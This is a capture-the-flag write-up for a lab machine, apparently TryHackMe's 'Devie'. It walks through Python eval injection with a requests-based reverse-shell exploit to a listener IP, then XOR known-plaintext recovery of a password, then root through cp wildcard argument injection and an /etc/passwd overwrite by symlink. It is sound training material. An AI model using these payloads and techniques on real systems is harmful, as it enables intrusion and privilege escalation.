This machine starts off with a website that solves mathematical equations. On the website we can download the source code, which we can use to find out where the vulnerability, that will allow us to get the foothold for this box, lies.

### Foothold

We can download the source code for this web application. Upon looking through the source code, my initial thought was Server-Side Template Injection as it seemed to output data onto the website, but this didn't look exploitable.  In the `app.py` file, we notice `eval` being used. 

```python
@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
```

The input is user input so we can exploit this to run arbitrary commands so we can spawn a reverse shell by inputting `__import__('os').system("COMMAND")`. We set up a listener and run the exploit script.

```python
import requests

url = "http://MACHINE_IP:5000"

rev_shell = "__import__('os').system(\"bash+-c+'bash+-i+>%26+/dev/tcp/10.18.11.118/9001+0>%261'\")#"
payload = f"xa={rev_shell}&xb=3"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

response = requests.post(url, data=payload, headers=headers)
``` 

### Lateral movement

We check out the account we got access to and find the first flag. We also see a note and find out we can run `/usr/bin/python3 /opt/encrypt.py` as sudo (gordon) without needing a password.
```bash
bruce@devie:~$ id 
id
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
bruce@devie:~$ ls
ls
checklist
flag1.txt
note
bruce@devie:~$ cat flag1.txt
cat flag1.txt
THM{**REDACTED**}
bruce@devie:~$ cat note
cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. Ill share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
bruce@devie:~$ sudo -l
sudo -l
Matching Defaults entries for bruce on devie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

Running this script uses XOR to encrypt a provided value and then base64 encodes the encrypted value. XOR is considered a weak cipher because it's vulnerable to [Known-plain-text attacks (KPA)](https://alamot.github.io/xor_kpa/), which is basically, when you have two values you can always derive the third value: 
- plain-text x key = encrypted_text
- encrypted_text x plain-text = key
- encrypted_text x key = plain-text

If the key is smaller than the plaintext, the key is repeated. If we provide a long enough password, we will be able to extract the full key.

```bash
bruce@devie:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
EhQRBBMSBAITBBUKBBgZDhMZDhMSFBEEExIEAhMEFQoEGBkOExkOExIUEQQ=
```

We can make a python script that finds out these values for us by using the two known values, and the found secret in the `notes` file to find Gordon's password.

```python
import base64
import sys

def cut_until_repeat(s):
    # if we provide a long enough value to encrypt the key will repeat.
    # An example would be for password "pass1234567890":
    # key123key123ke
    # we need to cut out key out of repeated values
    for i in range(1, len(s) // 2 + 1):
        if s[:i] * (len(s) // i) + s[:len(s) % i] == s:
            return s[:i]
    return s

def decode_string(base64_string):
    #convert base64 value to bytes for b64decode
    base64_bytes = base64_string.encode('ascii')
    # decode base64 value
    decoded_string = base64.b64decode(base64_bytes)
    # covert base64 decoded value back to a string
    base64_string_decoded = decoded_string.decode('ascii')
    return base64_string_decoded

def xor(password, key):
    xor=""
    # iterate over the shortest length of the provided values to avoid extra chars being returned
    for i in range(0,min(len(password), len(key))):
        xor += chr(ord(password[i]) ^ ord(key[i%len(key)]))
    return xor

password = sys.argv[1]
base64_string = sys.argv[2]
encrypted_secret = sys.argv[3]

base64_string_decoded = decode_string(base64_string)
encrypted_secret_decoded = decode_string(encrypted_secret)

key = cut_until_repeat(xor(password, base64_string_decoded))
print(f'found secret: {key}')
pw = xor(key, encrypted_secret_decoded)
print(f'found password: {pw}')
```

```bash
$ python3 xor.py aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa EhQRBBMSBAITBBUKBBgZDhMZDhMSFBEEExIEAhMEFQoEGBkOExkOExIUEQQ= NEUEDTIeN1MRDg5K
found secret: supersecretkeyxorxor
found password: G0th@mR0ckz!
```

### Privilege Escalation

We can now use Gordon's account to escalate our privileges. Looking into the Home directory, we find the second flag:

```bash
$ id
uid=1001(gordon) gid=1001(gordon) groups=1001(gordon)
$ whoami
gordon
$ ls
bruce
gordon
$ cd gordon
$ ls
backups
flag2.txt
reports
$ cat flag2.txt
THM{**REDACTED**}
```

We also find as a reports and backups folder. From further investigation it looks like the report folder get back-upped into the backups folder each minute:

```bash
$ ls -lah
total 1.2M
drwxrwx--- 2 gordon gordon 4.0K Apr  4 09:44 .
drwxr-xr-x 4 gordon gordon 4.0K Aug  2  2022 ..
-rwsr-xr-x 1 root   root   1.2M Apr  4 09:47 bash
-rw-r--r-- 1 root   root     57 Apr  4 11:15 report1
-rw-r--r-- 1 root   root     72 Apr  4 11:15 report2
-rw-r--r-- 1 root   root    100 Apr  4 11:15 report3
```

We can't find a cronjob by running `cat /etc/crontab`, we could run [pspy](https://github.com/DominicBreuker/pspy) to see which script gets executed but by enumeration we can also find this.

- We first check all the files that have a suid id:

    `find / -type f -perm -u=s -ls 2>/dev/null`
- We then check all the files that Gordon has access to, filtering out all the directories that contain "proc" or "sys":
    
    `find / -user gordon -type f 2>/dev/null | grep -v "proc\|sys"`
- Then we find which commands the group Gordon has access to:

    `find / -type f -group gordon 2>/dev/null | grep -v "proc\|sys` 

The last command provides an interesting result:
```bash
$ find / -type f -group gordon 2>/dev/null | grep -v "proc\|sys"       
/opt/encrypt.py
/usr/bin/backup
/home/gordon/.profile
/home/gordon/.viminfo
/home/gordon/flag2.txt
/home/gordon/reports/bash
/home/gordon/reports/report2
/home/gordon/reports/report1
/home/gordon/reports/report3
/home/gordon/.bash_logout
/home/gordon/.bashrc
$ cat /usr/bin/backup
#!/bin/bash
cd /home/gordon/reports/
cp * /home/gordon/backups/
```

When looking at the script we can see there is an `*` being used as a wildcard to copy the files. This can lead to a [wildcard exploit](https://0xdf.gitlab.io/2021/10/16/htb-dynstr.html#wildcard-exploit). By using the `--preserve` option we can write any file that will be owned as root to the `/home/gordon/backups/` directory.

>â€“preserve[=ATTR_LIST]
>
>preserve the specified attributes (default: mode,ownership,timestamps), if possible additional attributes: context, links, xattr, all

We can copy bash to the `reports` directory, assign it the `setuid` bit (SUID) through `chmod u+s bash`. SUID allows users to run an executable with the file system permissions of the executable's owner meaning that if bash gets copied through the wildcard exploit it will get root as owner. Allowing us to execute commands as root by spawning `backups/bash`.

We also have to add a empty file called `--preserve=mode` which will add this option to the `cp` command of the `/usr/bin/backup` script ensuring the `setuid` bit permission is maintained when it gets copied to the backups directory.

```bash
gordon@devie:~/reports$ cp /bin/bash .
gordon@devie:~/reports$ chmod u+s bash         
gordon@devie:~/reports$ echo '' > '--preserve=mode'        
gordon@devie:~/reports$ ls -lah
total 1.2M
drwxrwx--- 2 gordon gordon 4.0K Apr  4 09:44 .
drwxr-xr-x 4 gordon gordon 4.0K Aug  2  2022 ..
-rwsr-xr-x 1 gordon gordon 1.2M Apr  4 09:43 bash
-rw-rw-r-- 1 gordon gordon    1 Apr  4 09:44 --preserve=mode
-rw-r--r-- 1    640 gordon   57 Feb 19 23:31 report1
-rw-r--r-- 1    640 gordon   72 Feb 19 23:32 report2
-rw-r--r-- 1    640 gordon  100 Feb 19 23:33 report3
```

To make it understandable, we could look at how the `cp` command looks if we construct it as it would be executed:
```bash
cp bash report1 report2 report3 --preserve=mode /home/gordon/backups/
```

After waiting for a minute, we can go into the `backups` directory and execute `bash` which will spawn a root shell:

```bash
gordon@devie:~/backups$ ls -lah
total 1.2M
drwxrwx--- 2 gordon gordon 4.0K Apr  4 09:44 .
drwxr-xr-x 4 gordon gordon 4.0K Aug  2  2022 ..
-rwsr-xr-x 1 root   root   1.2M Apr  4 09:47 bash
-rw-r--r-- 1 root   root     57 Apr  4 11:29 report1
-rw-r--r-- 1 root   root     72 Apr  4 11:29 report2
-rw-r--r-- 1 root   root    100 Apr  4 11:29 report3
gordon@devie:~/backups$ ./bash -p
$ whoami
root
$ cat /root/root.txt
THM{**REDACTED**}
```

#### Alternative solution
In another [write-up](https://medium.com/@herve.costil/try-hack-me-writeup-devie-4188e768afd0), an alternative solution had been documented. They made a copy of `/etc/passwd` in a newly made `reports` directory and then change `uid` and `gid` to `0` which is root.

From:

>gordon:x:1001:1001::/home/gordon:/bin/bash

To:

>gordon:x:0:0::/home/gordon:/bin/bash

They initially removed the `backups` folder and added a [symlink](https://en.wikipedia.org/wiki/Symbolic_link) to `/etc`:
```bash
ln -s /etc backups
```

When the backup script ran as root, the original `/etc/passwd` file gets overwritten by the modified one which is stored in `reports/passwd`.

```
gordon@devie:/home/gordon$ mv reports/ reports.bak/
gordon@devie:/home/gordon$ mv backups/ backups.bak/
gordon@devie:/home/gordon$ mkdir reports
gordon@devie:/home/gordon$ cp /etc/passwd reports
gordon@devie:/home/gordon$ vi reports/passwd 
gordon@devie:/home/gordon$ ln -s /etc/ backups
```

When re-authenticating as the gordon user, the gordon user now has root permissions:

```bash
gordon@devie:/home/gordon$ su - gordon
Password: 
root@devie:~$ whoami
root
```
